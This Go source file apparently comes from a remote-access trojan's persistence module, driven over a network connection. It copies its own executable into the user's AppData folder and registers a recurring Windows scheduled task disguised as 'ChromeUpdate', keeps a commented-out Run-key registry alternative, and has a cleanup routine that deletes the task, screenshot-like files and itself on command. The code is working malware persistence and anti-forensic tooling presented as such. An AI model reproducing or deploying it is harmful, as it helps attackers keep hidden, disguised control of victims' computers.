package persist

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func Schedule(connection net.Conn) (err error) {

	reader := bufio.NewReader(connection)
	command_raw, err := reader.ReadString('\n')
	command := strings.TrimSpace(command_raw)
	fmt.Println(command)

	home, _ := os.UserHomeDir()

	appdata := filepath.Join(home, "AppData\\Roaming")
	exe_name := filepath.Base(os.Args[0])
	appdata_with_exe := appdata + "\\" + exe_name
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	xml_path := appdata + "\\schtask.xml"

	fmt.Println("appdata : ", appdata)
	fmt.Println("exe_name : ", exe_name)
	fmt.Println("appdata_with_exe : ", appdata_with_exe)
	fmt.Println("without_exe : ", without_ext)
	fmt.Println("xml_path : ", xml_path)

	appdata_cd_command := os.Chdir(appdata)
	if appdata_cd_command != nil {
		panic(appdata_cd_command)
	}

	xml_data := "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.4\">" +
		"\n<RegistrationInfo>" +
		"\n<Author>Anon\\Anonymous</Author>" +
		"\n<URI>\\ChromeUpdate</URI>" +
		"\n</RegistrationInfo>" +
		"\n<Triggers>" +
		"\n<TimeTrigger>" +
		"\n<Repetition>" +
		"\n<Interval>PT" + command + "M</Interval>" +
		"\n<StopAtDurationEnd>false</StopAtDurationEnd>" +
		"\n</Repetition>" +
		"\n<StartBoundary>2015-05-06T23:24:00</StartBoundary>" +
		"\n<Enabled>true</Enabled>" +
		"\n</TimeTrigger>" +
		"\n</Triggers>" +
		"\n<Principals>" +
		"\n<Principal id=\"Author\">" +
		"\n<UserId>S-1-5-21-3114169349-1207689747-4105279568-1001</UserId>" +
		"\n<LogonType>InteractiveToken</LogonType>" +
		"\n<RunLevel>LeastPrivilege</RunLevel>" +
		"\n</Principal>" +
		"\n</Principals>" +
		"\n<Settings>" +
		"\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
		"\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
		"\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" +
		"\n<AllowHardTerminate>true</AllowHardTerminate>" +
		"\n<StartWhenAvailable>false</StartWhenAvailable>" +
		"\n<RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>" +
		"\n<IdleSettings>" +
		"\n<StopOnIdleEnd>true</StopOnIdleEnd>" +
		"\n<RestartOnIdle>false</RestartOnIdle>" +
		"\n</IdleSettings>" +
		"\n<AllowStartOnDemand>true</AllowStartOnDemand>" +
		"\n<Enabled>true</Enabled>" +
		"\n<Hidden>false</Hidden>" +
		"\n<RunOnlyIfIdle>false</RunOnlyIfIdle>" +
		"\n<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>" +
		"\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>" +
		"\n<WakeToRun>false</WakeToRun>" +
		"\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>" +
		"\n<Priority>7</Priority>" +
		"\n</Settings>" +
		"\n<Actions Context=\"Author\">" +
		"\n<Exec>" +
		"\n<Command>" + appdata_with_exe + "</Command>" +
		"\n</Exec>" +
		"\n</Actions>" +
		"\n</Task>"

	file, err := os.Create("schtask.xml")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(xml_data))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	c := exec.Command("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	fmt.Println("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")

	c1 := exec.Command("powershell", "Copy-Item", os.Args[0], appdata)
	if err := c1.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	fmt.Println("C1", "powershell", "Copy-Item", os.Args[0], appdata)

	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	fmt.Println("C2 : ", "powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)

	/*
		c3 := exec.Command("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
		if err := c3.Run(); err != nil {
			fmt.Println("Error: ", err)
		}

		fmt.Println("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
	*/
	nbytes, err := connection.Write([]byte("[#] xml written\n"))
	if err != nil {
		panic(err)
	}
	fmt.Println("[+]", nbytes, "bytes written")

	return
}

func Remove(connection net.Conn) (err error) {

	home, _ := os.UserHomeDir()
	appdata := filepath.Join(home, "AppData\\Roaming")
	exe_name := filepath.Base(os.Args[0])
	appdata_with_exe := appdata + "\\" + exe_name
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	xml_path := appdata + "\\schtask.xml"

	content := "schtasks /DELETE /TN " + without_ext + " /F" +
		"\ndel " + xml_path +
		"\ndel %AppData%\\\\image.bmp" +
		"\ndel %AppData%\\\\ss.png" +
		"\ntaskkill /im " + exe_name + " /f" +
		"\ndel " + appdata_with_exe +
		"\n" +
		"\nrem SETLOCAL" +
		"\nrem SET someOtherProgram=SomeOtherProgram.exe" +
		"\nrem TASKKILL /IM \"%someOtherProgram%\"" +
		"\nrem DEL \"%~f0\""

	file, err := os.Create("clean.bat")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(content))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	cmd := exec.Command("powershell", "./clean.bat")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	error := cmd.Run()
	if error != nil {
		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
		return
	}

	c := exec.Command("powershell", "del", "clean.bat")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	nbytes, erro := connection.Write([]byte(out.String()))
	if erro != nil {
		panic(erro)
	}
	fmt.Println("[+]", nbytes, "bytes written\n")

	return

}
